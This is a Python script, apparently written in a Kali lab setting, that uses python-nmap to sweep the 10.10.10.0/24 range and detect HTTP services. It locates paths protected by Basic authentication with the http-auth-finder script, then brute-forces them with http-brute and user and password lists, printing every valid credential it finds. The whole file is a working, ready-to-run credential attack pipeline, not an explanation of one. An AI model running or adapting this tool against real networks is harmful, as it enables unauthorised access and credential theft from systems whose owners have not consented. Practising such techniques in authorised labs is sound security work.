import nmap
import re

nm = nmap.PortScanner()

ip_range = "10.10.10.1/24"

nm.scan(ip_range,arguments='-sn')

#for host in nm.all_hosts():
#	print(host)
ip_list = ' '.join(nm.all_hosts())

#print(ip_list)

nm.scan(ip_list,arguments='-sV')
#print(nm.scaninfo())

http_ip_list = []
http_port_list = []

for ip in nm.all_hosts():
	if "tcp" in nm[ip]:
		#print(nm[ip]['tcp'].keys())
		#print("---"*20)
		for port in nm[ip]['tcp'].keys():
			#print(nm[ip]['tcp'][port])
			if(nm[ip]['tcp'][port]['name']=="http"):
				name = nm[ip]['tcp'][port]['name']
				product = nm[ip]['tcp'][port]['product']
				version = nm[ip]['tcp'][port]['version']
				#print(ip,port,name,product,version)
				if ip not in http_ip_list:
					http_ip_list.append(ip)
				if port not in http_port_list:
					http_port_list.append(str(port))

#print("#######")
#print("#######")
#print("#######")
#print(http_ip_list)
#print(http_port_list)

#/usr/share/nmap/scripts/http-auth-finder.nse

nm.scan(' '.join(http_ip_list),','.join(http_port_list),'--script http-auth-finder')
#print(nm.scaninfo())
#print(nm.all_hosts())

targets = []

for host in nm.all_hosts():
	#print(nm[host]['tcp'].keys())
	for port in nm[host]['tcp'].keys():
		#print(nm[host]['tcp'][port])
		if "script" in nm[host]['tcp'][port]:
			#print(nm[host]['tcp'][port]['script']['http-auth-finder'])
			paths = re.findall(host+":"+str(port)+"(.*)HTTP: Basic",nm[host]['tcp'][port]['script']['http-auth-finder'])
			for path in paths:
				#print(path)
				new_target = {"host":host,"port":str(port),"path":path.strip()}
				targets.append(new_target)

#print(targets)

#/usr/share/nmap/scripts/http-brute.nse

userdb = "/home/kali/Desktop/uygulamalar/nmap/user.lst"
passdb = "/home/kali/Desktop/uygulamalar/nmap/pass.lst"

for target in targets:
	host = target['host']
	port = target['port']
	path = target['path']
	nm.scan(host,port,'-sV --script http-brute --script-args path='+path+',userdb='+userdb+',passdb='+passdb)
	#print(nm[host]['tcp'][int(port)]['script']['http-brute'])
	creds = re.findall("(.*)- Valid",nm[host]['tcp'][int(port)]['script']['http-brute'])
	for cred in creds:
		print(host+":"+port+path," >> ",cred.strip())